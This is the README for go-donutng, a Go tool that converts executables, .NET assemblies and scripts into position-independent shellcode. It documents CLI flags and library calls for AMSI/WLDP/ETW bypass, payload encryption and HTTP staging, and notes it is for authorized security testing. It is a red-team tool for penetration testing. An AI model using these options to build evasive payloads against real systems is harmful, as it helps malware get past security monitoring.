# go-donutng

Pure Go implementation of [Donut](https://github.com/TheWover/donut) shellcode generator.

**Drop-in replacement for [Binject/go-donut](https://github.com/Binject/go-donut)**

Converts PE files (.exe, .dll), .NET assemblies, and scripts (VBS/JS) into position-independent shellcode.

## Features

- PE support: Native EXE/DLL and .NET assemblies
- Script support: VBScript and JScript
- Automatic .NET CLR version detection
- AMSI/WLDP/ETW bypass options
- aPLib compression
- Chaskey block cipher encryption (CTR mode)
- Output formats: Binary, Base64, C, Python, PowerShell, C#, Ruby, Hex, UUID
- HTTP staging support

## Installation

```bash
go install github.com/gubarz/go-donutng@latest
```

Or build from source:

```bash
git clone https://github.com/gubarz/go-donutng
cd go-donutng
go build -o go-donutng .
```

## CLI Usage

```bash
# Basic - convert EXE to shellcode
go-donutng -i payload.exe

# Specify output and architecture
go-donutng -i payload.exe -o loader.bin -a 2

# .NET DLL with class and method
go-donutng -i managed.dll -c MyNamespace.MyClass -m RunMe

# Native DLL with function and args
go-donutng -i native.dll -m DllMain -p "arg1 arg2"

# HTTP staging
go-donutng -i payload.exe -s https://example.com/payload

# Output as C array
go-donutng -i payload.exe -f 3 -o payload.c

# Disable encryption
go-donutng -i payload.exe -e 1
```

### CLI Options

| Flag | Default | Description |
|------|---------|-------------|
| `-i` | | Input file (required) |
| `-o` | `payload.bin` | Output file |
| `-a` | `3` | Architecture: 1=x86, 2=x64, 3=x86+x64 |
| `-b` | `3` | Bypass: 1=None, 2=Abort, 3=Continue |
| `-k` | `1` | Headers: 1=Overwrite, 2=Keep |
| `-z` | `1` | Compression: 1=None, 2=aPLib |
| `-e` | `3` | Entropy: 1=None, 2=Random, 3=Random+Encrypt |
| `-f` | `1` | Format: 1=Bin, 2=Base64, 3=C, 4=Ruby, 5=Py, 6=PS1, 7=C#, 8=Hex, 9=UUID |
| `-x` | `1` | Exit: 1=Thread, 2=Process, 3=Block |
| `-t` | `true` | Run entrypoint as thread |
| `-y` | `0` | OEP offset |
| `-r` | | CLR runtime version |
| `-d` | | AppDomain name |
| `-c` | | Class name (.NET DLL) |
| `-m` | | Method/function name |
| `-p` | | Parameters |
| `-w` | `false` | Unicode parameters |
| `-s` | | HTTP staging server URL |
| `-u` | | HTTP auth (user:pass) |
| `-j` | | Decoy module path |

## Library Usage

```go
package main

import "github.com/gubarz/go-donutng/donut"

func main() {
    // Simple
    shellcode, _ := donut.CreateFromFile("payload.exe")
    
    // With options
    shellcode, _ = donut.CreateFromFile("payload.exe",
        donut.ArchX64(),
        donut.WithCompression(donut.DONUT_COMPRESS_APLIB),
        donut.WithFormat(donut.DONUT_FORMAT_C),
    )
    
    // .NET assembly
    shellcode, _ = donut.CreateFromFile("managed.dll",
        donut.WithClass("MyNamespace.MyClass"),
        donut.WithMethod("Execute"),
        donut.WithArgs("arg1 arg2"),
    )
    
    // HTTP staging
    shellcode, _ = donut.CreateFromFile("payload.exe",
        donut.WithServer("https://example.com/payload"),
        donut.WithAuth("user", "pass"),
    )
    
    // Save formatted output
    donut.SaveToFile(shellcode, "output.c", donut.DONUT_FORMAT_C)
}
```

### Full Config

```go
config := donut.DefaultConfig()
config.Input = "payload.exe"
config.Arch = donut.X64
config.Bypass = donut.DONUT_BYPASS_CONTINUE
config.Compress = donut.DONUT_COMPRESS_APLIB
config.Entropy = donut.DONUT_ENTROPY_DEFAULT
config.Format = donut.DONUT_FORMAT_BINARY
config.ExitOpt = donut.DONUT_OPT_EXIT_THREAD

donut.DonutCreate(config)
// Shellcode in config.Pic
```

### Available Options

```go
donut.ArchX86()                                    // x86 architecture
donut.ArchX64()                                    // x64 architecture
donut.WithArch(donut.X84)                          // x86+x64
donut.WithBypass(donut.DONUT_BYPASS_CONTINUE)      // AMSI/WLDP/ETW bypass
donut.WithCompression(donut.DONUT_COMPRESS_APLIB)  // aPLib compression
donut.WithEntropy(donut.DONUT_ENTROPY_DEFAULT)     // Encryption enabled
donut.WithFormat(donut.DONUT_FORMAT_C)             // Output format
donut.WithExitOption(donut.DONUT_OPT_EXIT_THREAD)  // Exit behavior
donut.WithClass("Namespace.Class")                 // .NET class
donut.WithMethod("Method")                         // Method/function name
donut.WithArgs("args")                             // Parameters
donut.WithRuntime("v4.0.30319")                    // CLR version
donut.WithDomain("MyDomain")                       // AppDomain
donut.WithServer("https://...")                    // HTTP staging
donut.WithAuth("user", "pass")                     // HTTP auth
donut.WithHeaders(true)                            // Keep PE headers
donut.WithUnicode(true)                            // Unicode params
donut.NoBypass()                                   // Disable bypass
donut.NoEncryption()                               // Disable encryption
donut.ExitThread()                                 // Exit via thread
donut.ExitProcess()                                // Exit via process
donut.ExitBlock()                                  // Block indefinitely
```

## Credits

- Original Donut by [TheWover](https://github.com/TheWover) and [Odzhan](https://github.com/odzhan)
- Loader shellcode (`loader_exe_x64.go`, `loader_exe_x86.go`) from [Donut v1.1](https://github.com/TheWover/donut/releases/tag/v1.1)
- Inspired by [Binject/go-donut](https://github.com/Binject/go-donut)

## License

BSD 3-Clause

## Disclaimer

For authorized security testing and research only.
